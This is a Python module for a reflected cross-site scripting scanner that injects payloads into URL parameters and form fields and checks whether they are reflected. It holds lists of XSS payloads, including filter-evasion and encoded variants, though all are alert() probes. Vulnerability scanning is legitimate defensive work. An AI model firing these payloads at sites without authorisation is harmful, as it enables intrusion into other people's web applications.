"""
Reflected XSS Scanner Module - Detects Reflected Cross-Site Scripting vulnerabilities
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs
import re
import time
import random
from bs4 import BeautifulSoup
from rich.console import Console
from colorama import Fore, Style

console = Console()

class ReflectedXSSScanner:
    def __init__(self):
        self.name = "Reflected XSS Scanner"
        self.description = "Detects Reflected Cross-Site Scripting vulnerabilities"
        
        # Basic payloads
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]
        
        # Advanced payloads with encoding and filter evasion
        self.advanced_payloads = [
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS');\"></iframe>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "javascript:/*--></title></style></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;</script></svg>",
            "<img src=1 href=1 onerror=\"javascript:alert('XSS')\">"
        ]
        
        # Event handler payloads
        self.event_handler_payloads = [
            "\" onmouseover=\"alert('XSS')\" \"",
            "\" onfocus=\"alert('XSS')\" autofocus \"",
            "\" onblur=\"alert('XSS')\" autofocus \"",
            "\" onkeydown=\"alert('XSS')\" \"",
            "\" onload=\"alert('XSS')\" \"",
            "\" onerror=\"alert('XSS')\" \""
        ]
        
        # DOM-based XSS payloads that might also trigger reflected XSS
        self.dom_payloads = [
            "#<script>alert('XSS')</script>",
            "?q=<script>alert('XSS')</script>",
            "javascript:alert('XSS')//"
        ]
        
        # Generate unique identifiers for each scan to detect blind XSS
        self.scan_id = f"xss{random.randint(10000, 99999)}"
        
        self.headers = {
            'User-Agent': 'CyberNexus/1.0 Security Scanner',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        
    def scan(self, url, verbose=False, delay=0.5):
        if verbose:
            console.print(f"[bold blue]Starting Reflected XSS scan on {url}[/bold blue]")
        else:
            print(f"{Fore.BLUE}[*] Starting Reflected XSS scan on {url}{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        # First, crawl the page to find forms and parameters
        try:
            response = requests.get(url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                for param in params:
                    if verbose:
                        console.print(f"[cyan]Testing URL parameter:[/cyan] {param}")
                    else:
                        print(f"{Fore.CYAN}[*] Testing URL parameter: {param}{Style.RESET_ALL}")
                    
                    # Test with basic payloads first
                    for payload in self.basic_payloads:
                        test_url = self._build_test_url(url, param, payload)
                        if self._test_xss(test_url, payload, verbose):
                            vulnerabilities.append(f"Reflected XSS found in URL parameter '{param}' with payload: {payload}")
                            break
                    
                    # If no vulnerability found with basic payloads, try advanced ones
                    if not any(param in vuln for vuln in vulnerabilities):
                        for payload in self.advanced_payloads:
                            test_url = self._build_test_url(url, param, payload)
                            if self._test_xss(test_url, payload, verbose):
                                vulnerabilities.append(f"Reflected XSS found in URL parameter '{param}' with payload: {payload}")
                                break
                            time.sleep(delay)  # Add delay between requests
            
            # Check forms
            forms = soup.find_all('form')
            for i, form in enumerate(forms):
                if verbose:
                    console.print(f"[cyan]Testing form #{i+1}[/cyan]")
                else:
                    print(f"{Fore.CYAN}[*] Testing form #{i+1}{Style.RESET_ALL}")
                
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(url, form_action) if form_action else url
                
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', '')
                    
                    if not input_name:
                        continue
                        
                    if verbose:
                        console.print(f"[cyan]Testing form input:[/cyan] {input_name} (type: {input_type})")
                    else:
                        print(f"{Fore.CYAN}[*] Testing form input: {input_name} (type: {input_type}){Style.RESET_ALL}")
                    
                    # Select payloads based on input type
                    payloads = self.basic_payloads
                    
                    if input_type.lower() in ['text', 'search', 'url', 'email', 'textarea']:
                        payloads = self.basic_payloads + self.advanced_payloads
                    elif input_type.lower() in ['button', 'submit']:
                        payloads = self.event_handler_payloads
                    
                    for payload in payloads:
                        if self._test_form_xss(form_url, form_method, input_name, payload, inputs, verbose):
                            vulnerabilities.append(f"Reflected XSS found in form input '{input_name}' with payload: {payload}")
                            break
                        time.sleep(delay)  # Add delay between requests
                            
        except Exception as e:
            error_msg = f"Error during XSS scan: {str(e)}"
            if verbose:
                console.print(f"[bold red]{error_msg}[/bold red]")
            else:
                print(f"{Fore.RED}[!] {error_msg}{Style.RESET_ALL}")
            return [error_msg]
            
        if not vulnerabilities:
            vulnerabilities.append("No Reflected XSS vulnerabilities found")
            
        return vulnerabilities
    
    def _build_test_url(self, url, param, payload):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        # Rebuild query string
        query_string = "&".join([f"{k}={v[0]}" for k, v in params.items()])
        
        # Rebuild URL
        return parsed._replace(query=query_string).geturl()
    
    def _test_xss(self, url, payload, verbose=False):
        try:
            if verbose:
                console.print(f"[dim]Testing payload:[/dim] {payload}")
            
            response = requests.get(url, headers=self.headers, timeout=10)
            return self._check_reflection(response.text, payload, verbose)
        except Exception as e:
            if verbose:
                console.print(f"[red]Error testing XSS:[/red] {str(e)}")
            return False
    
    def _test_form_xss(self, form_url, form_method, input_name, payload, all_inputs, verbose=False):
        data = {}
        
        # Fill all inputs with dummy data
        for input_field in all_inputs:
            name = input_field.get('name')
            if name:
                data[name] = "test"
        
        # Replace target input with payload
        data[input_name] = payload
        
        try:
            if verbose:
                console.print(f"[dim]Testing form payload:[/dim] {payload}")
            
            if form_method == 'post':
                response = requests.post(form_url, data=data, headers=self.headers, timeout=10)
            else:
                response = requests.get(form_url, params=data, headers=self.headers, timeout=10)
                
            return self._check_reflection(response.text, payload, verbose)
        except Exception as e:
            if verbose:
                console.print(f"[red]Error testing form XSS:[/red] {str(e)}")
            return False
    
    def _check_reflection(self, content, payload, verbose=False):
        # Check if the payload is reflected in the response
        
        # Remove whitespace for more accurate matching
        normalized_payload = re.sub(r'\s+', '', payload)
        normalized_content = re.sub(r'\s+', '', content)
        
        if normalized_payload in normalized_content:
            # Check context of reflection
            soup = BeautifulSoup(content, 'html.parser')
            
            # Check if it's inside a script tag
            scripts = soup.find_all('script')
            for script in scripts:
                if payload in script.string if script.string else '':
                    if verbose:
                        console.print(f"[bold red]XSS payload found in script tag![/bold red]")
                    return True
            
            # Check if it's in an attribute
            for tag in soup.find_all():
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and payload in value:
                        if verbose:
                            console.print(f"[bold red]XSS payload found in {tag.name} {attr} attribute![/bold red]")
                        return True
            
            # Check if it's directly in HTML
            if payload in content:
                if verbose:
                    console.print(f"[bold red]XSS payload found in HTML content![/bold red]")
                return True
            
        return False